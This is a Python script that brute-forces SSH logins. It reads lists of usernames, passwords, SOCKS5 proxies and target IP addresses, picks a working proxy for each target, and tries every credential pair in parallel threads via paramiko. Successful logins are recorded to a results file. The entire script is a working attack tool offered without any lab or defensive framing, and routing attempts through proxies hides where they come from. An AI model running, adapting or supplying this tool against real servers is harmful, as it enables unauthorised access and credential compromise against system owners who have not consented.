import threading
import paramiko
import socks

def test_proxy(proxy, ip):
    try:
        proxy_host, proxy_port = proxy.split(":")
        proxy_type = socks.PROXY_TYPE_SOCKS5
        proxy_sock = socks.socksocket()
        proxy_sock.set_proxy(proxy_type, proxy_host, int(proxy_port))
        proxy_sock.settimeout(5)
        proxy_sock.connect((ip, 22))
        proxy_sock.close()
        return True
    except Exception as e:
        return False

def ssh_connect(username, password, proxy, ip, results):
    try:
        proxy_host, proxy_port = proxy.split(":")
        proxy_type = socks.PROXY_TYPE_SOCKS5
        proxy_sock = socks.socksocket()
        proxy_sock.set_proxy(proxy_type, proxy_host, int(proxy_port))
        proxy_sock.settimeout(5)
        proxy_sock.connect((ip, 22))

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=ip, username=username, password=password, sock=proxy_sock,allow_agent=False,look_for_keys=False)

        print(f"Successfully connected to remote server {ip} with username '{username}' and password '{password}' via proxy '{proxy}'")
        result = f"IP: {ip} - Username: {username} - Password: {password} - Proxy: {proxy}\n"
        results.append(result)
        ssh.close()
    except Exception as e:
        print(f"Could not connect to remote server {ip} with username '{username}' and password '{password}' via proxy '{proxy}': {e}")

def main():
    with open("usernames.txt", "r") as f:
        username_list = [line.strip() for line in f.readlines()]

    with open("passwords.txt", "r") as f:
        password_list = [line.strip() for line in f.readlines()]

    with open("proxies.txt", "r") as f:
        proxy_list = [line.strip() for line in f.readlines()]

    with open("ip.txt", "r") as f:
        ip_list = [line.strip() for line in f.readlines()]

    n = int(input("Enter the number of threads: "))

    results = []

    for ip in ip_list:
        active_proxy = None
        for proxy in proxy_list:
            if test_proxy(proxy, ip):
                active_proxy = proxy
                break

        if active_proxy is not None:
            for username in username_list:
                for password in password_list:
                    thread = threading.Thread(target=ssh_connect, args=(username, password, active_proxy, ip, results))
                    thread.start()
        else:
            print(f"No active proxy found for IP: {ip}")

    for thread in threading.enumerate():
        if thread != threading.current_thread():
            thread.join()

    with open("result.txt", "w") as f:
        f.writelines(results)

if __name__ == "__main__":
    main()

